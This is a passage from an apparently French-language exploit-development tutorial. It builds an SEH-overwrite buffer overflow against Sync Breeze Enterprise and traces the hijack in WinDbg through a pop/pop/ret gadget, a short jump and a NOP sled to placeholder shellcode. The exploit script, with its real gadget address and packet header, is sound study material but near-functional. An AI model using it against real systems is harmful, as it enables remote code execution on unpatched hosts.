<a id="__codelineno-59-9" name="__codelineno-59-9" href="#__codelineno-59-9"></a>  <span class="n">size</span> <span class="p">=</span> <span class="n">1000</span>
<a id="__codelineno-59-10" name="__codelineno-59-10" href="#__codelineno-59-10"></a>
<a id="__codelineno-59-11" name="__codelineno-59-11" href="#__codelineno-59-11"></a>  <span class="n">shellcode</span> <span class="p">=</span> <span class="n">b</span><span class="s2">&quot;\x43&quot;</span> <span class="p">*</span> <span class="n">400</span>
<a id="__codelineno-59-12" name="__codelineno-59-12" href="#__codelineno-59-12"></a>
<a id="__codelineno-59-13" name="__codelineno-59-13" href="#__codelineno-59-13"></a>  <span class="n">inputBuffer</span> <span class="p">=</span> <span class="n">b</span><span class="s2">&quot;\x41&quot;</span> <span class="p">*</span> <span class="n">124</span>
<a id="__codelineno-59-14" name="__codelineno-59-14" href="#__codelineno-59-14"></a>  <span class="n">inputBuffer</span> <span class="p">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,(</span><span class="n">0x06eb9090</span><span class="p">))</span>             <span class="c"># (NSEH)</span>
<a id="__codelineno-59-15" name="__codelineno-59-15" href="#__codelineno-59-15"></a>  <span class="n">inputBuffer</span> <span class="p">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">0x1015a2f0</span><span class="p">))</span>            <span class="c"># (SEH)  P/P/R</span>
<a id="__codelineno-59-16" name="__codelineno-59-16" href="#__codelineno-59-16"></a>  <span class="n">inputBuffer</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x90&quot;</span> <span class="p">*</span> <span class="p">(</span><span class="n">size</span> <span class="p">-</span> <span class="n">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">)</span> <span class="p">-</span> <span class="n">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<a id="__codelineno-59-17" name="__codelineno-59-17" href="#__codelineno-59-17"></a>  <span class="n">inputBuffer</span> <span class="p">+=</span> <span class="n">shellcode</span>
<a id="__codelineno-59-18" name="__codelineno-59-18" href="#__codelineno-59-18"></a>
<a id="__codelineno-59-19" name="__codelineno-59-19" href="#__codelineno-59-19"></a>  <span class="n">header</span> <span class="p">=</span>  <span class="n">b</span><span class="s2">&quot;\x75\x19\xba\xab&quot;</span>
<a id="__codelineno-59-20" name="__codelineno-59-20" href="#__codelineno-59-20"></a>  <span class="n">header</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x03\x00\x00\x00&quot;</span>
<a id="__codelineno-59-21" name="__codelineno-59-21" href="#__codelineno-59-21"></a>  <span class="n">header</span> <span class="p">+=</span> <span class="n">b</span><span class="s2">&quot;\x00\x40\x00\x00&quot;</span>
<a id="__codelineno-59-22" name="__codelineno-59-22" href="#__codelineno-59-22"></a>  <span class="n">header</span> <span class="p">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-59-23" name="__codelineno-59-23" href="#__codelineno-59-23"></a>  <span class="n">header</span> <span class="p">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-59-24" name="__codelineno-59-24" href="#__codelineno-59-24"></a>  <span class="n">header</span> <span class="p">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">[-</span><span class="n">1</span><span class="p">])</span>
<a id="__codelineno-59-25" name="__codelineno-59-25" href="#__codelineno-59-25"></a>
<a id="__codelineno-59-26" name="__codelineno-59-26" href="#__codelineno-59-26"></a>  <span class="n">buf</span> <span class="p">=</span> <span class="n">header</span> <span class="p">+</span> <span class="n">inputBuffer</span>
<a id="__codelineno-59-27" name="__codelineno-59-27" href="#__codelineno-59-27"></a>  <span class="p">[...]</span>
</code></pre></div>
<p>WinDbg suite à l'exécution de l'exploit :</p>
<ul>
<li><em>Access violation</em></li>
<li>Définition du point d'arrêt comme précédemment sur l'<em>exception_handler</em></li>
<li>Relancer l'exécution</li>
<li>Exécution de la séquence P/P/R</li>
<li>Exécution du <em>short jump</em></li>
<li>Exécution des instructions <code>NOP</code></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a><span class="p">(</span><span class="n">d24</span><span class="p">.</span><span class="n">155c</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a><span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a><span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="n">and</span> <span class="n">handled</span><span class="p">.</span>
<a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a><span class="p">***</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Sync</span> <span class="n">Breeze</span> <span class="n">Enterprise</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">libpal</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-60-6" name="__codelineno-60-6" href="#__codelineno-60-6"></a><span class="n">eax</span><span class="p">=</span><span class="n">41414141</span> <span class="n">ebx</span><span class="p">=</span><span class="n">019bfa1c</span> <span class="n">ecx</span><span class="p">=</span><span class="n">019bff18</span> <span class="n">edx</span><span class="p">=</span><span class="n">019bf9d4</span> <span class="n">esi</span><span class="p">=</span><span class="n">019bff18</span> <span class="n">edi</span><span class="p">=</span><span class="n">019bfb20</span>
<a id="__codelineno-60-7" name="__codelineno-60-7" href="#__codelineno-60-7"></a><span class="n">eip</span><span class="p">=</span><span class="n">008d2a9d</span> <span class="n">esp</span><span class="p">=</span><span class="n">019bf9a8</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019bfec8</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">ng</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-60-8" name="__codelineno-60-8" href="#__codelineno-60-8"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010286</span>
<a id="__codelineno-60-9" name="__codelineno-60-9" href="#__codelineno-60-9"></a><span class="n">libpal</span><span class="p">!</span><span class="n">SCA_ConfigObj</span><span class="p">::</span><span class="n">Deserialize</span><span class="p">+</span><span class="n">0x1d</span><span class="p">:</span>
<a id="__codelineno-60-10" name="__codelineno-60-10" href="#__codelineno-60-10"></a><span class="n">008d2a9d</span> <span class="n">ff5024</span>          <span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="p">+</span><span class="n">24h</span><span class="p">]</span>  <span class="n">ds</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">41414165</span><span class="p">=????????</span>
<a id="__codelineno-60-11" name="__codelineno-60-11" href="#__codelineno-60-11"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">exchain</span>
<a id="__codelineno-60-12" name="__codelineno-60-12" href="#__codelineno-60-12"></a><span class="n">019bfe1c</span><span class="p">:</span> <span class="n">libpal</span><span class="p">!</span><span class="n">md5_starts</span><span class="p">+</span><span class="n">149fb</span> <span class="p">(</span><span class="n">0094df5b</span><span class="p">)</span>
<a id="__codelineno-60-13" name="__codelineno-60-13" href="#__codelineno-60-13"></a><span class="n">019bff54</span><span class="p">:</span> <span class="p">***</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Sync</span> <span class="n">Breeze</span> <span class="n">Enterprise</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">libspp</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-60-14" name="__codelineno-60-14" href="#__codelineno-60-14"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">16460</span> <span class="p">(</span><span class="n">1015a2f0</span><span class="p">)</span>
<a id="__codelineno-60-15" name="__codelineno-60-15" href="#__codelineno-60-15"></a><span class="n">Invalid</span> <span class="n">exception</span> <span class="n">stack</span> <span class="n">at</span> <span class="n">06eb9090</span>
<a id="__codelineno-60-16" name="__codelineno-60-16" href="#__codelineno-60-16"></a><span class="c">#</span>
<a id="__codelineno-60-17" name="__codelineno-60-17" href="#__codelineno-60-17"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0x1015a2f0</span>
<a id="__codelineno-60-18" name="__codelineno-60-18" href="#__codelineno-60-18"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-60-19" name="__codelineno-60-19" href="#__codelineno-60-19"></a><span class="n">Breakpoint</span> <span class="n">0</span> <span class="n">hit</span>
<a id="__codelineno-60-20" name="__codelineno-60-20" href="#__codelineno-60-20"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-60-21" name="__codelineno-60-21" href="#__codelineno-60-21"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">esp</span><span class="p">=</span><span class="n">019bf438</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019bf458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-60-22" name="__codelineno-60-22" href="#__codelineno-60-22"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-60-23" name="__codelineno-60-23" href="#__codelineno-60-23"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16460</span><span class="p">:</span>
<a id="__codelineno-60-24" name="__codelineno-60-24" href="#__codelineno-60-24"></a><span class="n">1015a2f0</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-60-25" name="__codelineno-60-25" href="#__codelineno-60-25"></a><span class="c">#</span>
<a id="__codelineno-60-26" name="__codelineno-60-26" href="#__codelineno-60-26"></a><span class="c"># P/P/R</span>
<a id="__codelineno-60-27" name="__codelineno-60-27" href="#__codelineno-60-27"></a><span class="c">#</span>
<a id="__codelineno-60-28" name="__codelineno-60-28" href="#__codelineno-60-28"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="nb">r</span>
<a id="__codelineno-60-29" name="__codelineno-60-29" href="#__codelineno-60-29"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-60-30" name="__codelineno-60-30" href="#__codelineno-60-30"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">esp</span><span class="p">=</span><span class="n">019bf438</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019bf458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-60-31" name="__codelineno-60-31" href="#__codelineno-60-31"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-60-32" name="__codelineno-60-32" href="#__codelineno-60-32"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16460</span><span class="p">:</span>
<a id="__codelineno-60-33" name="__codelineno-60-33" href="#__codelineno-60-33"></a><span class="n">1015a2f0</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-60-34" name="__codelineno-60-34" href="#__codelineno-60-34"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-60-35" name="__codelineno-60-35" href="#__codelineno-60-35"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-60-36" name="__codelineno-60-36" href="#__codelineno-60-36"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f1</span> <span class="n">esp</span><span class="p">=</span><span class="n">019bf43c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019bf458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-60-37" name="__codelineno-60-37" href="#__codelineno-60-37"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-60-38" name="__codelineno-60-38" href="#__codelineno-60-38"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16461</span><span class="p">:</span>
<a id="__codelineno-60-39" name="__codelineno-60-39" href="#__codelineno-60-39"></a><span class="n">1015a2f1</span> <span class="n">5b</span>              <span class="n">pop</span>     <span class="n">ebx</span>
<a id="__codelineno-60-40" name="__codelineno-60-40" href="#__codelineno-60-40"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-60-41" name="__codelineno-60-41" href="#__codelineno-60-41"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">019bf540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-60-42" name="__codelineno-60-42" href="#__codelineno-60-42"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f2</span> <span class="n">esp</span><span class="p">=</span><span class="n">019bf440</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019bf458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-60-43" name="__codelineno-60-43" href="#__codelineno-60-43"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-60-44" name="__codelineno-60-44" href="#__codelineno-60-44"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16462</span><span class="p">:</span>
<a id="__codelineno-60-45" name="__codelineno-60-45" href="#__codelineno-60-45"></a><span class="n">1015a2f2</span> <span class="n">c3</span>              <span class="n">ret</span>
<a id="__codelineno-60-46" name="__codelineno-60-46" href="#__codelineno-60-46"></a><span class="c">#</span>
<a id="__codelineno-60-47" name="__codelineno-60-47" href="#__codelineno-60-47"></a><span class="c"># SHORT JUMP</span>
<a id="__codelineno-60-48" name="__codelineno-60-48" href="#__codelineno-60-48"></a><span class="c">#</span>
<a id="__codelineno-60-49" name="__codelineno-60-49" href="#__codelineno-60-49"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-60-50" name="__codelineno-60-50" href="#__codelineno-60-50"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">019bf540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-60-51" name="__codelineno-60-51" href="#__codelineno-60-51"></a><span class="n">eip</span><span class="p">=</span><span class="n">019bff54</span> <span class="n">esp</span><span class="p">=</span><span class="n">019bf444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019bf458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-60-52" name="__codelineno-60-52" href="#__codelineno-60-52"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-60-53" name="__codelineno-60-53" href="#__codelineno-60-53"></a><span class="n">019bff54</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-60-54" name="__codelineno-60-54" href="#__codelineno-60-54"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-60-55" name="__codelineno-60-55" href="#__codelineno-60-55"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">019bf540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-60-56" name="__codelineno-60-56" href="#__codelineno-60-56"></a><span class="n">eip</span><span class="p">=</span><span class="n">019bff55</span> <span class="n">esp</span><span class="p">=</span><span class="n">019bf444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019bf458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-60-57" name="__codelineno-60-57" href="#__codelineno-60-57"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-60-58" name="__codelineno-60-58" href="#__codelineno-60-58"></a><span class="n">019bff55</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-60-59" name="__codelineno-60-59" href="#__codelineno-60-59"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-60-60" name="__codelineno-60-60" href="#__codelineno-60-60"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">019bf540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-60-61" name="__codelineno-60-61" href="#__codelineno-60-61"></a><span class="n">eip</span><span class="p">=</span><span class="n">019bff56</span> <span class="n">esp</span><span class="p">=</span><span class="n">019bf444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019bf458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-60-62" name="__codelineno-60-62" href="#__codelineno-60-62"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-60-63" name="__codelineno-60-63" href="#__codelineno-60-63"></a><span class="n">019bff56</span> <span class="n">eb06</span>            <span class="n">jmp</span>     <span class="n">019bff5e</span>
<a id="__codelineno-60-64" name="__codelineno-60-64" href="#__codelineno-60-64"></a><span class="c">#</span>
<a id="__codelineno-60-65" name="__codelineno-60-65" href="#__codelineno-60-65"></a><span class="c"># DEBUT DES \x90</span>
<a id="__codelineno-60-66" name="__codelineno-60-66" href="#__codelineno-60-66"></a><span class="c">#</span>
<a id="__codelineno-60-67" name="__codelineno-60-67" href="#__codelineno-60-67"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-60-68" name="__codelineno-60-68" href="#__codelineno-60-68"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">019bf540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-60-69" name="__codelineno-60-69" href="#__codelineno-60-69"></a><span class="n">eip</span><span class="p">=</span><span class="n">019bff5e</span> <span class="n">esp</span><span class="p">=</span><span class="n">019bf444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">019bf458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-60-70" name="__codelineno-60-70" href="#__codelineno-60-70"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-60-71" name="__codelineno-60-71" href="#__codelineno-60-71"></a><span class="n">019bff5e</span> <span class="n">90</span>              <span class="n">nop</span>
</code></pre></div>
<p>On veut maintenant chercher dans toute la pile  le passage de <code>0x90</code> à notre shellcode de <code>0x43</code>. Pour cela on récupère les adresses de début et de fin de la pile :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">teb</span>
<a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a><span class="n">TEB</span> <span class="n">at</span> <span class="n">00304000</span>
<a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>    <span class="n">ExceptionList</span><span class="p">:</span>        <span class="n">019bf44c</span>
<a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a>    <span class="n">StackBase</span><span class="p">:</span>            <span class="n">019c0000</span>
<a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a>    <span class="n">StackLimit</span><span class="p">:</span>           <span class="n">019be000</span>
<a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a><span class="p">[...]</span>
</code></pre></div>
<p>On recherche dans toute la pile le passage de <code>0x90</code> à notre shellcode de <code>0x43</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">s</span> <span class="n">-b</span> <span class="n">019be000</span> <span class="n">019c0000</span> <span class="n">90</span> <span class="n">90</span> <span class="n">90</span> <span class="n">90</span> <span class="n">43</span> <span class="n">43</span> <span class="n">43</span> <span class="n">43</span> <span class="n">43</span> <span class="n">43</span> <span class="n">43</span> <span class="n">43</span>
<a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="n">019bfc70</span>  <span class="n">90</span> <span class="n">90</span> <span class="n">90</span> <span class="n">90</span> <span class="n">43</span> <span class="n">43</span> <span class="n">43</span> <span class="n">43</span><span class="p">-</span><span class="n">43</span> <span class="n">43</span> <span class="n">43</span> <span class="n">43</span> <span class="n">43</span> <span class="n">43</span> <span class="n">43</span> <span class="n">43</span>  <span class="p">....</span><span class="n">CCCCCCCCCCCC</span>
</code></pre></div>
<p>On vérifie que le shellcode n'est pas tronqué :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">dd</span> <span class="n">019bfc70</span> <span class="n">L65</span>
